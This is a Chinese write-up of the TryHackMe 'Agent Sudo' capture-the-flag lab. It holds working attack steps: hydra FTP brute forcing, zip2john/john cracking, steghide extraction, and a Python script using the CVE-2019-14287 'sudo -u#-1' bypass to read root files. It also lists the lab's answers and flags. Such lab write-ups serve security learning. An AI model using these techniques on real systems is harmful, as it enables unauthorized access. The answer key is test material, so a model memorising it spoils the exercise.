# sudo特工-wp-简单-tryhackme

## 枚举

>开放多少个端口？
``````
sudo nmap -Pn -A 10.10.196.189
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
``````
答案：3

>如何将自己重定向到秘密页面？

重定向页面有两个，user-agent是R和C  
通过R的界面猜测C的界面  
重定向C的界面：  
Attention chris,  
Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!  
From,  
Agent R   
答案：user-agent
>代理名称是什么？
 

答案：chris


## 哈希破解和暴力破解
由于R说C的密码太脆弱，可以想到C的密码可以爆破  
爆破ftp的密码：  
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.74.222
>FTP密码

答案：crystal
>压缩文件密码
这个地方直接大力出奇迹，用john的工具zip2john破解
``````
zip2john 8702.zip > password.txt
john --wordlist=/usr/share/wordlists/rockyou.txt
``````
答案：alien
  
>steg password

文件内容：  
Agent C,  
We need to send the picture to 'QXJlYTUx' as soon as possible!  
By,  
Agent R 
妈的，QXJlYTUx居然是base64，没见过这么短的base64

答案：Area51
>另一位特工是谁（全名）？

需要用到steghide这个软件，这个软件是解隐写术的题的  
steghide extract -sf FILE(需要有密码，密码是Area51)  
解出messages.txt  
Hi james,  
Glad you find this message. Your login password is hackerrules!  
Don't ask me why the password look cheesy, ask agent R who set this password for you.  
Your buddy,  
chris  

答案：james
>SSH密码

答案：hackerrules


## 捕获用户标志

>什么是用户标志？
登陆后ls

答案：b03d975e8c92a7c04146cfa7a5a313c7
>照片中的事件叫什么？


## 权限提升

>升级的 CVE 编号 （格式：CVE-xxxx-xxxx）
sudo -l然后在google上搜索(ALL, !root) /bin/bash  

答案：CVE-2019-14287

>什么是根标志？

看下面的代码：  
``````
#!/usr/bin/python3
import os
#Get current username
username = input("Enter current username :")
#check which binary the user can run with sudo
os.system("sudo -l > priv")
os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")
binary_file = open("binary")
binary= binary_file.read()
#execute sudo exploit
print("Lets hope it works")
os.system("sudo -u#-1 "+ binary)
``````
主要做的操作就是：  
sudo -l > priv /把sudo -l的输出写入priv这个文件里  
cat priv | grep 'ALL' | cut -d ')' -f 2 > binary /把“看不懂思密达”输出到binary这个文件里  
"sudo -u#-1 "+ binary /把这个命令和binary的内容拼接（binary的内容实际上就是/bin/bash）  
cat /root/root.txt
答案：b53a02f55b57d4439e3341834d70c062
>（奖励）R 特工是谁？

To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R

答案：DesKel